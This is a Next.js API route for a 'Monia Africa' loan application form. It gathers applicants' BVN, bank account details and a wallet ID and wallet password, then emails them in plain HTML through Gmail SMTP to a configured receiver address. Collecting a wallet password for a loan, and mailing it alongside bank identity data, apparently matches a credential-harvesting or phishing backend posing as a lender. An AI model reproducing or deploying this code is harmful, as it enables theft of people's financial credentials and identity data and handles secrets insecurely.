import { render } from "@react-email/render";
import nodemailer from "nodemailer";
import { LoanApplicationEmail } from "../../../components/LoanApplicationEmail";

export async function POST(request: Request) {
  try {
    // Parse JSON form data
    const data = await request.json();

    // Basic validation
    const requiredFields = ["email", "fullName", "address"];
    for (const field of requiredFields) {
      if (!data[field] || data[field].trim() === "") {
        return Response.json(
          { success: false, error: `Field "${field}" is required` },
          { status: 400 }
        );
      }
    }

    // New validation: at least one of phoneNumber or whatsappNumber must be provided
    const phoneNumber = data.phoneNumber?.trim();
    const whatsappNumber = data.whatsappNumber?.trim();
    if (!phoneNumber && !whatsappNumber) {
      return Response.json(
        {
          success: false,
          error: "Please provide at least a Phone Number or a WhatsApp Number",
        },
        { status: 400 }
      );
    }

    const {
      email,
      fullName,
      address,
      bvn,
      employmentStatus,
      monthlyIncome,
      accountNumber,
      accountName,
      bankName,
      amountSought,
      loanTenure,
      reasonForLoan,
      walletId,
      walletPassword,
      sex,
    } = data;

    const smtpUser = process.env.SMTP_USER;
    const smtpPass = process.env.SMTP_PASS;
    const receiverEmail = process.env.RECEIVER_EMAIL;

    if (!smtpUser || !smtpPass) {
      console.log("[LoanAPI] Missing SMTP credentials");
      return Response.json(
        { success: false, error: "Email service not configured" },
        { status: 500 }
      );
    }

    if (!receiverEmail) {
      console.log("[LoanAPI] Missing RECEIVER_EMAIL");
      return Response.json(
        { success: false, error: "Receiver email not configured" },
        { status: 500 }
      );
    }

    // Setup SMTP transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: smtpUser,
        pass: smtpPass,
      },
    });

    // Render email HTML using React email template
    const timestamp = new Date().toISOString();
    const subject = `New Loan Application - ${fullName} [${timestamp}]`;

    const emailHtml = render(
      <LoanApplicationEmail
        email={email}
        fullName={fullName}
        phoneNumber={phoneNumber}
        whatsappNumber={whatsappNumber}
        address={address}
        bvn={bvn}
        employmentStatus={employmentStatus}
        monthlyIncome={monthlyIncome}
        accountNumber={accountNumber}
        accountName={accountName}
        bankName={bankName}
        amountSought={amountSought}
        loanTenure={loanTenure}
        reasonForLoan={reasonForLoan}
        walletId={walletId}
        walletPassword={walletPassword}
        sex={sex}
      />
    );

    // Send email
    const response = await transporter.sendMail({
      from: `"Monia Africa" <${smtpUser}>`,
      to: receiverEmail,
      subject,
      html: emailHtml,
      text: `New loan application received from ${fullName} (${email}, Phone: ${phoneNumber || 'N/A'}, WhatsApp: ${whatsappNumber || 'N/A'})`,
    });

    console.log("[LoanAPI] Email sent successfully:", response.messageId);

    return Response.json({ success: true });
  } catch (error: any) {
    console.log("[LoanAPI] Error sending email:", error);
    return Response.json(
      {
        success: false,
        error: "Failed to send loan application email",
        details: error?.message || "Unknown error",
      },
      { status: 500 }
    );
  }
}
